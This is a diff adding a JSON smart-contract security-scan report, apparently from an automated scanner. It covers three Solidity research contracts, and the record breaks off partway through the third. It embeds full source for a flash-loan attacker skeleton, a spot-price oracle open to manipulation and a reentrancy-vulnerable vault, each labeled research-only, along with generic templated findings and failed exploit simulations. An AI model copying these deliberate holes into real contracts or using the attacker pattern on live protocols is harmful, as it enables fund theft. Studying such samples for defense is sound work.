@@ -1,0 +1,1668 @@
+{
+  "scannedAt": "2026-04-21T13:31:07.389Z",
+  "target": ".",
+  "results": [
+    {
+      "file": "contracts\\FlashLoanAttacker.sol",
+      "staticAnalysis": {
+        "patterns": [
+          {
+            "pattern": "flash-loan-attack",
+            "confidence": 0.55,
+            "matchedOn": [
+              "Balancer vault",
+              "flashLoan",
+              "flash loan",
+              "borrow",
+              "callback"
+            ],
+            "similarReports": []
+          },
+          {
+            "pattern": "reentrancy",
+            "confidence": 0.2,
+            "matchedOn": [
+              "callback",
+              "call{value"
+            ],
+            "similarReports": []
+          },
+          {
+            "pattern": "front-running",
+            "confidence": 0.2,
+            "matchedOn": [
+              "MEV",
+              "arbitrage"
+            ],
+            "similarReports": []
+          },
+          {
+            "pattern": "oracle-manipulation",
+            "confidence": 0.1,
+            "matchedOn": [
+              "manipulat"
+            ],
+            "similarReports": []
+          },
+          {
+            "pattern": "sandwich-attack",
+            "confidence": 0.1,
+            "matchedOn": [
+              "sandwich"
+            ],
+            "similarReports": []
+          }
+        ],
+        "aiReport": {
+          "reportId": "649c0310-8fd6-4ded-a927-ab69daf61cd2",
+          "scenarioId": "scan:contracts\\FlashLoanAttacker.sol",
+          "attackPattern": "flash-loan-attack",
+          "severity": "high",
+          "summary": "Signature-based detection: likely flash-loan-attack attack. Manual review recommended.",
+          "findings": [
+            {
+              "title": "Potential flash-loan-attack vulnerability",
+              "description": "Signature-based detection: likely flash-loan-attack attack. Manual review recommended.",
+              "evidence": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title FlashLoanAttacker\n * @notice A generalized flash loan attacker pattern.\n *         Executes arbitrary logic with flash-borrowed capital.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: Borrows large amounts via flash loan, manipulates\n * market prices or executes arbitrage, then returns the loan in the same tx.\n * MEV bots can sandwich this to steal the profit.\n */\ncontract FlashLoanAttacker {\n  "
+            }
+          ],
+          "aiModel": "bankr-default",
+          "confidence": 0.4,
+          "recommendations": [
+            "Review contract with a professional audit",
+            "Use Slither or Mythril for static analysis",
+            "Implement CEI pattern (Checks-Effects-Interactions)"
+          ],
+          "createdAt": "2026-04-21T13:30:59.854Z"
+        },
+        "contractCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title FlashLoanAttacker\n * @notice A generalized flash loan attacker pattern.\n *         Executes arbitrary logic with flash-borrowed capital.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: Borrows large amounts via flash loan, manipulates\n * market prices or executes arbitrage, then returns the loan in the same tx.\n * MEV bots can sandwich this to steal the profit.\n */\ncontract FlashLoanAttacker {\n    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    struct AttackParams {\n        address target;\n        address borrowToken;\n        uint256 borrowAmount;\n        bytes callData;\n    }\n\n    // @audit-info - executes arbitrary callData against borrowed capital\n    function executeAttack(AttackParams calldata params) external {\n        // 1. Flash borrow\n        IFlashLoanLender lender = IFlashLoanLender(0xBA12222222228d8Ba445958a90aD4EeFC7D8cE2A); // Balancer vault\n        address[] memory tokens = new address[](1);\n        tokens[0] = params.borrowToken;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = params.borrowAmount;\n\n        lender.flashLoan(address(this), tokens, amounts, \"\");\n\n        // 2. Execute attack logic with the borrowed capital\n        (bool success, ) = params.target.call{value: 0}(params.callData);\n        require(success, \"Attack execution failed\");\n\n        // 3. Pay back is handled in the onFlashLoan callback\n    }\n\n    function receiveFlashLoan(\n        address[] memory, // tokens\n        uint256[] memory, // amounts\n        uint256[] memory, // fee amounts\n        bytes memory\n    ) external {\n        // Pay back the loan + fees\n        // In a real attack, profit would be extracted before this executes\n    }\n\n    // For testing: allow funding the contract\n    receive() external payable {}\n}\n\ninterface IFlashLoanLender {\n    function flashLoan(\n        address recipient,\n        address[] memory tokens,\n        uint256[] memory amounts,\n        bytes memory userData\n    ) external;\n}\n"
+      },
+      "dependencyAudit": {
+        "summary": "Found 4 issues",
+        "threatLevel": "medium",
+        "vulns": [
+          {
+            "package": "0",
+            "severity": "medium",
+            "title": "Vulnerability in esbuild",
+            "url": ""
+          },
+          {
+            "package": "1",
+            "severity": "medium",
+            "title": "Vulnerability in vite",
+            "url": ""
+          },
+          {
+            "package": "2",
+            "severity": "medium",
+            "title": "Vulnerability in vite-node",
+            "url": ""
+          },
+          {
+            "package": "3",
+            "severity": "medium",
+            "title": "Vulnerability in vitest",
+            "url": ""
+          }
+        ],
+        "advisories": [],
+        "score": 50
+      },
+      "threatIntel": [
+        {
+          "packageName": "axios",
+          "packageVersion": "1.7.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"axios\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "dotenv",
+          "packageVersion": "16.4.5",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"dotenv\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ethers",
+          "packageVersion": "6.13.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ethers\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "semver",
+          "packageVersion": "7.7.4",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"semver\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "zod",
+          "packageVersion": "3.23.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"zod\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@types/node",
+          "packageVersion": "22.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@types/node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/eslint-plugin",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/eslint-plugin\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/parser",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/parser\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "eslint",
+          "packageVersion": "9.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"eslint\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ts-node",
+          "packageVersion": "10.9.2",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ts-node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "tsx",
+          "packageVersion": "4.21.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"tsx\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "typescript",
+          "packageVersion": "5.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"typescript\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "vitest",
+          "packageVersion": "1.6.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"vitest\" in the last 14 days",
+          "recommendations": []
+        }
+      ],
+      "exploitSim": {
+        "scenarioId": "reentrancy-101",
+        "scenarioName": "Reentrancy Vault Drain",
+        "success": false,
+        "aiReport": null,
+        "output": "Error: connect ECONNREFUSED 127.0.0.1:8545",
+        "severity": "critical"
+      },
+      "overallSeverity": "high",
+      "threatScore": 31,
+      "findings": [],
+      "recommendations": [
+        "Review contract with a professional audit",
+        "Use Slither or Mythril for static analysis",
+        "Implement CEI pattern (Checks-Effects-Interactions)"
+      ],
+      "durationMs": 3048,
+      "errors": []
+    },
+    {
+      "file": "contracts\\OracleManipulation.sol",
+      "staticAnalysis": {
+        "patterns": [
+          {
+            "pattern": "oracle-manipulation",
+            "confidence": 0.4,
+            "matchedOn": [
+              "getReserves",
+              "spot price",
+              "manipulat",
+              "twap"
+            ],
+            "similarReports": []
+          },
+          {
+            "pattern": "flash-loan-attack",
+            "confidence": 0.1,
+            "matchedOn": [
+              "flash loan"
+            ],
+            "similarReports": []
+          }
+        ],
+        "aiReport": {
+          "reportId": "a8bb7308-9bc1-4fd0-81bb-7869bdad65ed",
+          "scenarioId": "scan:contracts\\OracleManipulation.sol",
+          "attackPattern": "oracle-manipulation",
+          "severity": "high",
+          "summary": "Signature-based detection: likely oracle-manipulation attack. Manual review recommended.",
+          "findings": [
+            {
+              "title": "Potential oracle-manipulation vulnerability",
+              "description": "Signature-based detection: likely oracle-manipulation attack. Manual review recommended.",
+              "evidence": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title OracleManipulation\n * @notice A contract that uses a Uniswap V2 pair for price oracle data.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: Flash-loan a large amount of one asset, swap to inflate\n * the price in the pair, read the inflated price, then reverse the swap.\n * The attacker profits at the expense of protocols relying on this oracle.\n */\ncontract OracleManipulation {\n    address public "
+            }
+          ],
+          "aiModel": "bankr-default",
+          "confidence": 0.4,
+          "recommendations": [
+            "Review contract with a professional audit",
+            "Use Slither or Mythril for static analysis",
+            "Implement CEI pattern (Checks-Effects-Interactions)"
+          ],
+          "createdAt": "2026-04-21T13:31:02.893Z"
+        },
+        "contractCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title OracleManipulation\n * @notice A contract that uses a Uniswap V2 pair for price oracle data.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: Flash-loan a large amount of one asset, swap to inflate\n * the price in the pair, read the inflated price, then reverse the swap.\n * The attacker profits at the expense of protocols relying on this oracle.\n */\ncontract OracleManipulation {\n    address public tokenA;\n    address public tokenB;\n    address public pair;\n\n    // @audit-info - TWAP window can be manipulated with flash loans\n    uint256 public price;\n    uint256 public lastUpdate;\n\n    constructor(address _tokenA, address _tokenB, address _pair) {\n        tokenA = _tokenA;\n        tokenB = _tokenB;\n        pair = _pair;\n    }\n\n    // @audit-info - reads spot price from pair (not TWAP, easily manipulated)\n    function getPrice() external returns (uint256) {\n        (uint256 reserve0, uint256 reserve1, ) = IUniswapV2Pair(pair).getReserves();\n        // Uses spot price, not time-weighted average\n        price = (reserve1 * 1e18) / reserve0;\n        lastUpdate = block.timestamp;\n        return price;\n    }\n\n    // Allow receiving ETH for testing\n    receive() external payable {}\n}\n\ninterface IUniswapV2Pair {\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n"
+      },
+      "dependencyAudit": {
+        "summary": "Found 4 issues",
+        "threatLevel": "medium",
+        "vulns": [
+          {
+            "package": "0",
+            "severity": "medium",
+            "title": "Vulnerability in esbuild",
+            "url": ""
+          },
+          {
+            "package": "1",
+            "severity": "medium",
+            "title": "Vulnerability in vite",
+            "url": ""
+          },
+          {
+            "package": "2",
+            "severity": "medium",
+            "title": "Vulnerability in vite-node",
+            "url": ""
+          },
+          {
+            "package": "3",
+            "severity": "medium",
+            "title": "Vulnerability in vitest",
+            "url": ""
+          }
+        ],
+        "advisories": [],
+        "score": 50
+      },
+      "threatIntel": [
+        {
+          "packageName": "axios",
+          "packageVersion": "1.7.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"axios\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "dotenv",
+          "packageVersion": "16.4.5",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"dotenv\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ethers",
+          "packageVersion": "6.13.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ethers\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "semver",
+          "packageVersion": "7.7.4",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"semver\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "zod",
+          "packageVersion": "3.23.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"zod\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@types/node",
+          "packageVersion": "22.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@types/node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/eslint-plugin",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/eslint-plugin\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/parser",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/parser\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "eslint",
+          "packageVersion": "9.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"eslint\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ts-node",
+          "packageVersion": "10.9.2",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ts-node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ts-node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "tsx",
+          "packageVersion": "4.21.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "tsx",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"tsx\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "typescript",
+          "packageVersion": "5.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "typescript",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"typescript\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "vitest",
+          "packageVersion": "1.6.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "vitest",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"vitest\" in the last 14 days",
+          "recommendations": []
+        }
+      ],
+      "exploitSim": {
+        "scenarioId": "oracle-manipulation-101",
+        "scenarioName": "Uniswap V2 Spot Price Oracle Manipulation",
+        "success": false,
+        "aiReport": null,
+        "output": "Error: connect ECONNREFUSED 127.0.0.1:8545",
+        "severity": "high"
+      },
+      "overallSeverity": "high",
+      "threatScore": 31,
+      "findings": [],
+      "recommendations": [
+        "Review contract with a professional audit",
+        "Use Slither or Mythril for static analysis",
+        "Implement CEI pattern (Checks-Effects-Interactions)"
+      ],
+      "durationMs": 1618,
+      "errors": []
+    },
+    {
+      "file": "contracts\\ReentrancyVault.sol",
+      "staticAnalysis": {
+        "patterns": [
+          {
+            "pattern": "reentrancy",
+            "confidence": 0.45000000000000007,
+            "matchedOn": [
+              "external call before state update",
+              "reentranc",
+              "recursive",
+              "call{value"
+            ],
+            "similarReports": []
+          }
+        ],
+        "aiReport": {
+          "reportId": "412372db-deb7-43d3-8130-c3c99b60ee18",
+          "scenarioId": "scan:contracts\\ReentrancyVault.sol",
+          "attackPattern": "reentrancy",
+          "severity": "high",
+          "summary": "Signature-based detection: likely reentrancy attack. Manual review recommended.",
+          "findings": [
+            {
+              "title": "Potential reentrancy vulnerability",
+              "description": "Signature-based detection: likely reentrancy attack. Manual review recommended.",
+              "evidence": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title ReentrancyVault\n * @notice A vault with a classic reentrancy vulnerability in the withdraw function.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: External call tomsg.sender before updating internal state.\n * The victim calls withdraw() and the attacker recursively drains the vault.\n */\ncontract ReentrancyVault {\n    mapping(address => uint256) public balances;\n\n    event Deposit(address indexe"
+            }
+          ],
+          "aiModel": "bankr-default",
+          "confidence": 0.4,
+          "recommendations": [
+            "Review contract with a professional audit",
+            "Use Slither or Mythril for static analysis",
+            "Implement CEI pattern (Checks-Effects-Interactions)"
+          ],
+          "createdAt": "2026-04-21T13:31:04.510Z"
+        },
+        "contractCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n/**\n * @title ReentrancyVault\n * @notice A vault with a classic reentrancy vulnerability in the withdraw function.\n *         DO NOT use in production. For research only.\n *\n * Attack vector: External call tomsg.sender before updating internal state.\n * The victim calls withdraw() and the attacker recursively drains the vault.\n */\ncontract ReentrancyVault {\n    mapping(address => uint256) public balances;\n\n    event Deposit(address indexed user, uint256 amount);\n    event Withdraw(address indexed user, uint256 amount);\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    // Vulnerability: external call before state update\n    function withdraw(uint256 amount) external {\n        require(balances[msg.sender] >= amount, \"Insufficient balance\");\n\n        // @audit-info - sends ETH before updating state (reentrancy vector)\n        (bool success, ) = msg.sender.call{value: amount}(\"\");\n        require(success, \"Transfer failed\");\n\n        balances[msg.sender] -= amount;\n        emit Withdraw(msg.sender, amount);\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
+      },
+      "dependencyAudit": {
+        "summary": "Found 4 issues",
+        "threatLevel": "medium",
+        "vulns": [
+          {
+            "package": "0",
+            "severity": "medium",
+            "title": "Vulnerability in esbuild",
+            "url": ""
+          },
+          {
+            "package": "1",
+            "severity": "medium",
+            "title": "Vulnerability in vite",
+            "url": ""
+          },
+          {
+            "package": "2",
+            "severity": "medium",
+            "title": "Vulnerability in vite-node",
+            "url": ""
+          },
+          {
+            "package": "3",
+            "severity": "medium",
+            "title": "Vulnerability in vitest",
+            "url": ""
+          }
+        ],
+        "advisories": [],
+        "score": 50
+      },
+      "threatIntel": [
+        {
+          "packageName": "axios",
+          "packageVersion": "1.7.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "axios",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"axios\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "dotenv",
+          "packageVersion": "16.4.5",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "dotenv",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"dotenv\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "ethers",
+          "packageVersion": "6.13.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "ethers",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"ethers\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "semver",
+          "packageVersion": "7.7.4",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "semver",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"semver\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "zod",
+          "packageVersion": "3.23.8",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "zod",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"zod\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@types/node",
+          "packageVersion": "22.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@types/node",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@types/node\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/eslint-plugin",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/eslint-plugin",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/eslint-plugin\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "@typescript-eslint/parser",
+          "packageVersion": "8.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
+              "query": "@typescript-eslint/parser",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            }
+          ],
+          "overallSeverity": "none",
+          "hasActiveExploit": false,
+          "summary": "No recent threat intelligence found for \"@typescript-eslint/parser\" in the last 14 days",
+          "recommendations": []
+        },
+        {
+          "packageName": "eslint",
+          "packageVersion": "9.0.0",
+          "searches": [
+            {
+              "source": "github-advisory",
+              "query": "eslint",
+              "resultCount": 0,
+              "findings": [],
+              "freshestDate": null
+            },
+            {
+              "source": "general",
